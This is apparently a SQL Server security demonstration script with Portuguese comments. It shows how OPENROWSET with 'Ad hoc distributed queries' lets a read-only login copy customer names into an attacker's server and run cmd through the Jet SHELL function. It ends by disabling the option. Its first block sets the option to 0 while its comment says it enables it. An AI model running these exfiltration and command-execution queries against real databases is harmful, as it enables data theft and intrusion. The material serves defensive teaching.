----------------------------------------------------------------------------------------------------
--------------------------- cria os dados no "ambiente do atacante" --------------------------------
----------------------------------------------------------------------------------------------------

CREATE TABLE dbo.Hacked_Clientes (
	Nome VARCHAR(100)
)

SELECT * FROM dbo.Hacked_Clientes


----------------------------------------------------------------------------------------------------
---------------------------- de volta ao ambiente que será atacado ---------------------------------
----------------------------------------------------------------------------------------------------

-- Habilitar a configuração "Ad hoc distributed queries" (para testes apenas - não recomendado)
sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO

sp_configure 'Ad hoc distributed queries', 0
GO

RECONFIGURE
GO




-- Cria o login
CREATE LOGIN [teste_openrowset] WITH PASSWORD = 'aaa', CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF, DEFAULT_DATABASE=master
GO

USE [dirceuresende]
GO

CREATE USER [teste_openrowset] FOR LOGIN [teste_openrowset]
GO

ALTER ROLE [db_datareader] ADD MEMBER [teste_openrowset]
GO


----------------------------------------------------------------------------------------------------
---------------------------- logado com o usuário teste_openrowset ---------------------------------
----------------------------------------------------------------------------------------------------

USE [dirceuresende]
GO

-- Identifico os dados que quero "roubar"
SELECT TOP 100 Nome FROM dbo.Clientes

-- Roubo os dados e insiro no meu banco "malicioso"
INSERT INTO OPENROWSET('SQLOLEDB', 'server=sqlserver,1438;uid=dirceu;pwd=aaa', 'SELECT TOP 100 Nome FROM dbo.Hacked_Clientes')
SELECT TOP 100 Nome
FROM dbo.Clientes

-- Posso usar também para executar o que eu quiser
SELECT * 
FROM OPENROWSET('SQLOLEDB', 'Database=C:\Windows\system32\ias\ias.mdb', 'SELECT SHELL(""cmd /c echo open 192.168.0.1 > teste.dat"")')



----------------------------------------------------------------------------------------------------
---------------------------- logado com um usuário sysadmin ---------------------------------
----------------------------------------------------------------------------------------------------

-- Desabilitar a configuração "Ad hoc distributed queries" (boa prática de segurança)
sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO

sp_configure 'Ad hoc distributed queries', 0
GO

RECONFIGURE
GO
